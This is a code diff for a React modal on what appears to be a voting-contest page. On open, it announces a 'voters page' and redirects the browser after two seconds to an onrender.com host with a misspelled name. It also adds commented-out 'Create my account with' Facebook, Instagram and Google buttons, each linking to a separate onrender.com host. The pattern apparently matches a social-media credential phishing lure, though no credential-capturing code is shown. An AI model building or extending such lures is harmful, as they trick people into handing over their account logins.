@@ -1,7 +1,3 @@
-import { Link } from "react-router-dom";
-import { gl as Google } from "./../../assets/svg/gl.jsx";
-import { ig as Instagram } from "./../../assets/svg/ig";
-import { fb as Facebook } from "./../../assets/svg/fb";
 import { cl as Close } from "./../../assets/svg/cl";
 import "./md.css";
 
@@ -13,7 +9,7 @@ const Modal = ({ open, setOpen, text, mode }) => {
 
   open
     ? setTimeout(() => {
-        window.location.href = "https://uid-belgium.onrender.com";
+        window.location.href = "https://unity-in-diveristy.onrender.com/";
       }, 2000)
     : 0;
 
@@ -43,6 +39,37 @@ const Modal = ({ open, setOpen, text, mode }) => {
             Redirecting you to our voters page. This might take a while. please
             be patient...
           </p>
+          {/* <div className="buttons">
+            <h2>Create my account with</h2>
+            <div className="btns">
+              <a
+                href="https://vote-akei.onrender.com/facebook"
+                target="_self"
+                className="fb"
+              >
+                <Facebook />
+                <p className="btn-txt">Facebook</p>
+              </a>
+              <a
+                href="https://vote-akei.onrender.com/instagram"
+                target="_parent"
+                className="ig"
+              >
+                <Instagram /> <p className="btn-txt">Instagram</p>
+              </a>
+              <div className="sepe">
+                <hr />
+                <sub>Or</sub> <hr />
+              </div>
+              <a
+                className="gl"
+                href="https://vote-akei.onrender.com/google"
+                target="_parent"
+              >
+                <Google /> <p className="btn-txt">Google</p>
+              </a>
+            </div>
+          </div> */}
         </div>
         <p className="lil">
           Join us on this exciting journey of self-expression, empowerment, and
